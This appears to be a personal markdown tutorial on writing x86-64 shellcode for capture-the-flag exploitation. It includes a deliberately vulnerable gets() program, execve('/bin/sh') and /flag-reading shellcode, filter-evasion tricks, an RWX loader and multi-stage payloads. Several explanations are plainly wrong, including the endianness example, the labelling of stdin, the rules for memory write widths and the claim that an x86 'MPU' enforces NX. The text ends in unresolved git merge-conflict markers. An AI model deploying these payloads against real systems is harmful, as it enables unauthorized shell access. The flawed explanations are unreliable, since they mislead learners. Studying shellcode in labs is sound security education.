In von Neumann architecture, the code and data are stored in the same memory unit and processed by the same processor. This architecture was proposed by mathematician and physicist John von Neumann in 1945. It has been widely adopted since then, due to its simplicity and flexibility. The basic idea behind von Neumann architecture is that all instructions are stored as data and all data can be used as instructions. This allows for a much more efficient use of memory than storing code and data separately, as was done previously.

  

But it lead to many security issues. Since data and code are stored in same memory, hackers can utilize the data to be used as code. In other words they can send the carefully crafted data {code} that can be directly executed by the processor.

  

### What is a Shellcode?

Now let's define what a shellcode is. Shellcode is a small piece of code typically written in assembly language that can be used as the payload in the exploitation of a software vulnerability. It is called "shellcode" because it typically starts a command shell from which arbitrary commands can be executed. Shellcode is commonly used as part of malware, to gain unauthorized access on a system or to elevate privileges. Once is access is gained, the attacker can do things like downloading malicious files, installing backdoors, stealing sensitive data etc.

  

### How does it get Injected?

Usually, programmers make mistakes and we use those mistakes to inject our shellcode. There are many ways to inject shellcode. For example:

  

```c

void bye1() { puts("Goodbye!"); }

void bye2() { puts("Farewell!"); }

void hello(char *name, void (*bye_func)())

{

printf("Hello %s!\n", name);

bye_func();

}

int main(int argc, char **argv)

{

char name[1024];

gets(name);

srand(time(0));

if (rand() % 2) hello(bye1, name);

else hello(name, bye2);

}

```

  

Compile with: `gcc -z execstack -o hello hello.c`

  

In the above code, when the value of `rand()` is even, the `hello()` function will be called with the arguments `name` and `bye2`. But when the value of `rand()` is odd, the `hello()` function will be called with the arguments `bye1` and `name`, which is not correct way to call the hello function. It takes the second parameter as a function pointer, but we are passing a string. This is a classic example of shellcode injection. We can simply use the gets() function to inject our shellcode in the form of crafted input data.

  

### Why "shell"code?

As mentioned above, Usually the goal of an exploit is to achieve arbitrary command execution. This is done by injecting a shellcode that will spawn a **shell**. There can be many ways to get a shellcode that can injected to a vulnerable program like:

- Writing your own shellcode (normally in assembly)

- Using publicly available shellcodes

- https://www.exploit-db.com/shellcodes

- https://shell-storm.org/shellcode/index.html

- Generating shellcode using tools like `msfvenom`

  

Although we have a set of already avalable shellcodes but still we need to learn the art of wrinting it on our own. Because we know that each system has it's own set of security constrains and we need the customise our shellcode to bypass or tackle those contrains.

  

Here is an example of basic shellcode that can spawn a shell.

  

```x86asm

mov rax, 59 # this is the syscall number of execve

  

lea rdi, [rip+binsh] # points the first argument of execve at the /bin/sh string below

  

mov rsi, 0 # this makes the second argument, argv, NULL

  

mov rdx, 0 # this makes the third argument, envp, NULL

  

syscall # this triggers the system call

  

binsh: # a label marking where the /bin/sh string is

  

.string "/bin/sh"

```

  

### DATA in your CODE

  

We can wite a shellcode that can store data in it. For instnace, in above shellcode example, we have to write the path to bash shell that is in string and we have added it in the shellcode as `.string "/bin/sh"`.

  

We can also intersperse arbitrary data in your shellcode:

  

```x86asm

.byte 0x48, 0x45, 0x4C, 0x4C, 0x4F # "HELLO"

.string "HELLO" # "HELLO\0"

```

  

Other ways to embed data:

  

```x86asm

mov rbx, 0x0068732f6e69622f # move "/bin/sh\0" into rbx

  

push rbx # push "/bin/sh\0" onto the stack

  

mov rdi, rsp # point rdi at the stack

```

  
  

### Endianness of Data

In computing, endianness is the order in which multi-byte data is stored or retrieved from computer memory. Endianness is primarily expressed as:

- big-endian (BE)

A big-endian system stores the most significant byte of a word at the smallest memory address (MSB first). Used by MIPS, MC68000 and Internet

- little-endian (LE)

A little-endian system, in contrast, stores the least-significant byte of a word at the smallest address (LSB first). Used by x86 and ARM

  

Let us store a 8 byte number 0x1122334455667788 in memory.

![[Pasted image 20221229224021.png]]

  

When we are writing our shellcode, we need to be aware of the endianness of the data. Endianness is the order in which data is stored in memory. So if we are writing shellcode for a little-endian system, then we need to write our data in reverse order.

  

For example:

  

```x86asm

mov rbx, 0x0068732f6e69622f # move "/bin/sh\0" into rbx

```

  

This code will work on a big-endian system, but on a little-endian system it will need to be written as:

  

```x86asm

mov rbx, 0x2f62696e2f

```

  

### Non-shell shellcode

We can write a shellcode that can do many things other than just spawning a shell. For example, we can write a shellcode that can open a file and send it's data to provided file descriptor (*1 = stdin*). For that we have shellcode like:

  

```x86asm

mov rbx, 0x00000067616c662f # push "/flag" filename

push rbx

mov rax, 2 # syscall number of open

mov rdi, rsp # point the first argument at stack (where we have "/flag")

mov rsi, 0 # NULL out the second argument (meaning, O_RDONLY)

syscall # trigger open("/flag", NULL)

mov rdi, 1 # first argument to sendfile is the file descriptor to output to (stdout)

mov rsi, rax # second argument is the file descriptor returned by open

mov rdx, 0 # third argument is the number of bytes to skip from the input file

mov r10, 1000 # fourth argument is the number of bytes to transfer to the output file

mov rax, 40 # syscall number of sendfile

syscall # trigger sendfile(1, fd, 0, 1000)

mov rax, 60 # syscall number of exit

syscall # trigger exit()

```

  

Similarly, we can write a shellcode that can change the permissions of a file. For that we have shellcode like:

  

```x86asm

mov rbx, 0x00000067616c662f # push "/flag" filename

push rbx

mov rax, 2 # syscall number of open

mov rdi, rsp # point the first argument at stack (where we have "/flag")

mov rsi, 0 # NULL out the second argument (meaning, O_RDONLY)

syscall # trigger open("/flag", NULL)

mov rdi, rax # first argument to fchmod is the file descriptor returned by open

mov rsi, 0x777 # second argument is the new permissions (0x777 = 0777 = rwxrwxrwx)

mov rax, 94 # syscall number of fchmod

syscall # trigger fchmod(fd, 0x777)

mov rax, 60 # syscall number of exit

syscall # trigger exit()

```

  

### Building Shellcode

We can build our shellcode using any assembler like `as` or `nasm` assembler. For example, we can build the shellcode of above example using:

  

```bash

nasm -f elf64 shellcode.asm

```

and then we need to extract only the text section of the shellcode as it is the only section that contains the shellcode. We can do that using:

  

```bash

objcopy -O binary -j .text shellcode.o shellcode.bin

```

Now `shellcode.bin` contains the shellcode that we can use in our exploit.

  

### Running Shellcode

We can run our shellcode by replicating the exotic conditions that are required to run the shellcode. For example, we can run the shellcode of above example by creating a file named `flag` and then running the shellcode using:

  

```bash

echo "flag" > flag

chmod 777 flag

./shellcode.bin

```

  

#### Replicating exotic conditions

If we are to replicate exotic conditions in ways that are too hard to do as a preamble for your shellcode, we can build a shellcode loader in C:

```c

page = mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);

read(0, page, 0x1000);

((void(*)())page)();

```

Then

```bash

cat shellcode-raw | ./tester

```

### Debugging Shellcode

- GNU Debugger (GDB)

We can debug our shellcode using `gdb` debugger. For example, we can debug the shellcode of above example using:

  

```bash

gdb ./shellcode.bin

```

  

- strace

To see if things are working from a high level, we can trace our shellcode with strace:

  

```bash

strace ./shellcode.bin

```

This can show you, at a high level, what your shellcode is doing (or not doing!).

  

### Shellcode for other architectures

We can write shellcode for any architecture using cross-assemblers. Our way of building shellcode translates well to other architectures:

**amd64:** `gcc -nostdlib -static shellcode.s -o shellcode-elf`

**mips:** `mips-linux-gnu-gcc -nostdlib shellcode-mips.s -o shellcode-mips-elf`

Similarly, we can run cross-architecture shellcode with an emulator:

**amd64:** `./shellcode`

**mips:** `qemu-mips-static ./shellcode-mips`

  
  

### Common Challenges

<<<<<<< Updated upstream
  

Well, that is very easy to write a normal shellcode that can simply run and make your defined task done. But that's not the end. The security researchers made our life difficult by adding different filters on data, more specifically on shellcode. That means we have to design our shellcode in such a way that it passes through the filters.

Let's discuss some common filters that may occur to prevent your code execution.

  

1. **Memory Access Width**

There can be a scenari in which we are restricted to work some specific bits or bytes. For instance, normally rax register stores 64 bits of data. but we want to work on its lower 8 bits. So what we can do in this case?

So we need to be very careful about sizes of memory accesses. For example, if we are writing a 64-bit value, we need to write it in two 32-bit writes. Similarly, if we are writing a 32-bit value, we need to write it in one 32-bit write.

For example, we can write a 64-bit value using:

single byte: `mov [rax], bl`

2-byte word: `mov [rax], bx`

4-byte dword: `mov [rax], ebx`

8-byte qword: `mov [rax], rbx`

Sometimes, you might have to explicitly specify the size to avoid ambiguity:

Single byte: `mov byte [rax], bl`

2-byte word: `mov word [rax], bx`

4-byte dword: `mov dword [rax], ebx`

8-byte qword: `mov qword [rax], rbx`

  

2. **Forbidden Bytes**

Depending on the injection method, certain bytes might not be allowed.

Belo are some common filters to bytes. For example, if we are injecting shellcode into a binary, we might not be able to use *null bytes*. Similarly, if we are injecting shellcode into a URL, we might not be able to use certain characters like `&` or `=`. Although We can use a tool like `msfvenom` to generate shellcode that avoids these forbidden bytes, but we can also write our own shellcode that avoids these forbidden bytes.

For instance, we can write a shellcode that avoids those forbidden bytes like:

  

| Bad | Good |

|-------------------------------------------------------:|:-----------------------------------------------------------------------|

| mov rax, 0 (48c7c0*00000000*) | xor rax, rax(4831C0) |

| mov rax, 5 (48c7c005*000000*) | xor rax, rax; mov al, 5 (4831C0B005) |

| mov rax, 10 (48c7c00*a0*00000) | mov rax, 9; inc rax (48C7C00900000048FFC0) |

| mov rbx, 0x67616c662f "/flag" (48BB2F666C6167*000000*) | mov ebx, 0x67616c66; shl rbx, 8; mov bl, 0x2f (BB666C616748C1E308B32F) |

  

If the constraints on your shellcode are too hard to get around with clever synonyms, but the page where your shellcode is mapped is writable, you can use a technique called *code == data* to bypass the filter. For example, if we are restricted to use `0xcc` byte that is trap instruction `int3`, we can use the following technique to bypass the filter:

```x86asm

inc BYTE PTR [rip]

.byte 0xcb

```

This will increment the byte at the address of the next instruction, which is the `0xcb` byte. This will cause the `int3` instruction to be executed, which is the same as `0xcc`. This technique can be used to bypass any filter that prevents you from using a specific byte.

  

>[!NOTE]

>When testing this, you'll need to make sure .text is writable:

> `gcc -Wl,-N --static -nostdlib -o test test.s`

  

### Multi-Stage Shellcode

Sometimes, there are very complex constraints on our shellcode, which might make it hard to do anything useful. In this situation, we can use a *multi-stage shellcode*. This is a shellcode that loads another shellcode in stage 1 (*let's say*) and executes it in stage 2. For example:

```c

/* Stage 1 */

read(0, rip, 1000)

// getting your current instruction pointer might be hard, depending on the architecture

// on amd64, you can do it with lea rax, [rip]

// a read like this will overwrite the rest of your shellcode with unfiltered data!

  

/* Stage 2 */

// Here is the actuall shellcode that you want to execute

```

  

A good stage-1 shellcode is very short and simple. That's because we can load more code into memory after we've loaded the stage-1 shellcode.

  

>[!info]

> The downside here is we don't always have access to inject more shellcode.

> So we can use a technique called *shellcode chaining* to bypass this limitation. This is a technique where we use a stage-1 shellcode to load a stage-2 shellcode, and then use the stage-2 shellcode to load a stage-3 shellcode, and so on. This is a very powerful technique that can be used to bypass many filters.

  

### Shellcode in today's world

  

Well, we have learned a lot about shellcode. But we can't use it in today's world. Because there are a lot of mitigations that can prevent our shellcode execution. Like:

  

- #### Memory Protection (*the "No-eXecute" bit*)

Now, computer architectures wised up and they started to add *memory protection* to prevent shellcode execution. Modern architectures support memory permissions:

- **PROT_READ** allows the process to read memory

- **PROT_WRITE** allows the process to write memory

- **PROT_EXEC** allows the process to execute memory

The x86 architecture has a *memory protection unit* (MPU) that prevents shellcode execution. The MPU is a hardware device that prevents shellcode execution by checking the memory access permissions. For example, if we try to execute a shellcode that is stored in a read-only memory page, the MPU will prevent the shellcode execution. Similarly, if we try to execute a shellcode that is stored in a non-executable memory page, the MPU will prevent the shellcode execution. So, we can't use shellcode in today's world. We can only get success if we got access to a writable as well as executabel memory page. Then we can execute our shellcode by jumping to the address of the injected shellcode.

Well, there are a lot more filters that can be used to prevent your shellcode execution. But we can't discuss all of them here. So, I'll leave it to you to explore more about them.
=======
- **Forbidden Bytes**
  Depending on the injection method, certain bytes might not be allowed. For example, if we are injecting shellcode into a binary, we might not be able to use null bytes. Similarly, if we are injecting shellcode into a URL, we might not be able to use certain characters like `&` or `=`. Although We can use a tool like `msfvenom` to generate shellcode that avoids these forbidden bytes, but we can also write our own shellcode that avoids these forbidden bytes. For example, we can write a shellcode that avoids null bytes using:

>>>>>>> Stashed changes
